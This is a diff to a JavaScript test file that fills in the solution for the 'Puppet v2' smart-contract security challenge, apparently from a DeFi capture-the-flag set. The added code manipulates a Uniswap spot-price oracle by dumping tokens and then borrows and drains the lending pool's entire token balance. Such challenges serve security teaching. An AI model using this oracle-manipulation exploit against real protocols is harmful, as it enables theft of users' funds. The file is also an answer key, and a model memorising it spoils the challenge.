@@ -82,7 +82,24 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);        
+        //swap ERC20 tokens for ETH to favor rate to us
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE, //amountIn
+            1, //amountOutMin
+            [token.address, weth.address], //path
+            player.address, //to
+            deadline //deadline
+        );
+        //wrap ETH to WETH
+        await weth.connect(player).deposit({value: ethers.utils.parseEther("19.6")});
+
+        const balanceERCToDrain = await token.balanceOf(lendingPool.address);
+        const amountWETHNeededToDrain = await lendingPool.calculateDepositOfWETHRequired(balanceERCToDrain);
+        await weth.connect(player).approve(lendingPool.address, amountWETHNeededToDrain);
+        //drain contract
+        await lendingPool.connect(player).borrow(balanceERCToDrain);
     });
 
     after(async function () {
